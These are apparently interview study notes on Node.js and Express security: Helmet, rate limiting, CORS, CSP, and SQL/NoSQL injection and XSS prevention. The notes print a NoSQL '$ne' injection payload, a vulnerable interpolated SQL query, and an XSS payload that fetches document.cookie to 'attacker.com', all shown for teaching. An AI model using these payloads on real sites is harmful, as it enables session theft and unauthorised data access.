# Node.js Security — Interview Notes

## 1. Helmet.js
Helmet.js is an Express middleware that sets secure HTTP headers to protect web applications from common web vulnerabilities like XSS, clickjacking, MIME sniffing, and other header-based attacks.

Protects against:
- Clickjacking
- MIME sniffing
- Information leakage
- Some XSS vectors via CSP

```js
import helmet from "helmet";
app.use(helmet());
```

---

## 2. Rate Limiting
Limits how many requests a user/IP can send within a certain time.
- too many login attempts (brute force)
- heavy usage (API misuse)
- traffic overload (DDoS spikes)

```js
import rateLimit from "express-rate-limit";
app.use(rateLimit({ windowMs: 15*60*1000, max: 200 }));
```

---

## 3. CORS (Cross-Origin Resource Sharing)
CORS controls which origins (websites/domains) are allowed to send requests to your server from the browser.
NOT a security measure against XSS/CSRF, but prevents unauthorized browser fetch.

```js
import cors from "cors";
app.use(cors({ origin: ["https://app.com"], credentials: true }));
```

---

## 4. CSP (Content Security Policy)
Prevents XSS by restricting which scripts/styles/images/fonts can load.

Key example:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  img-src 'self' data:;
```

---

## 5. SQL / NoSQL Injection
Injection allows attackers to manipulate DB queries.

### SQL Injection Vulnerable
```js
db.query(`SELECT * FROM users WHERE name='${user}'`);
```

Fix: Prepared statements
```js
db.query("SELECT * FROM users WHERE name=?", [user]);
```

### NoSQL (Mongo) Injection
```js
User.find({ username: req.body.username });
```

Payload example:
```json
{ "username": { "$ne": null } }
```

Fix: Validate & sanitize inputs.

---

## 6. XSS (Cross-Site Scripting)
Attacker injects malicious JavaScript.

Targets:
- Cookies
- JWT tokens
- DOM
- CSRF tokens

Payload example:
```html
<script>fetch('https://attacker.com?c='+document.cookie)</script>
```

Prevention techniques:
- CSP
- Output encoding
- Input validation
- Avoid `innerHTML`
- HttpOnly cookies
- Sanitizers (DOMPurify, sanitize-html)

---

## Combined Secure Setup (Express)
```js
app.use(helmet());
app.use(cors());
app.use(rateLimit({...}));
// plus sanitization + validation
```

---

## Extra Security Topics (Interview Must-Know)
- CSRF protection
- HTTPS enforcement
- Cookie flags: HttpOnly, Secure, SameSite
- Refresh token rotation
- WAF / API Gateway
- Redis cache for auth
- Authentication vs Authorization

---

## Common Interview Questions
1. How do you secure an Express API?
2. Difference between CORS, CSP, CSRF?
3. Why use HttpOnly cookies for tokens?
4. How does CSP prevent XSS?
5. How to prevent SQL/NoSQL injection?
6. Why implement rate limiting on login routes?
7. What does Helmet solve? What it doesn’t?
8. Does CORS prevent XSS? (Answer: No)
9. JWT vs Session security differences?

---

## TL;DR Summary
- **Helmet** → secure headers
- **Rate limiting** → stop brute-force & abuse
- **CORS** → control cross-origin browser requests
- **CSP** → block malicious scripts
- **SQL/NoSQL injection prevention** → validate + parameterize queries
- **XSS protection** → encode, sanitize, CSP, HttpOnly cookies
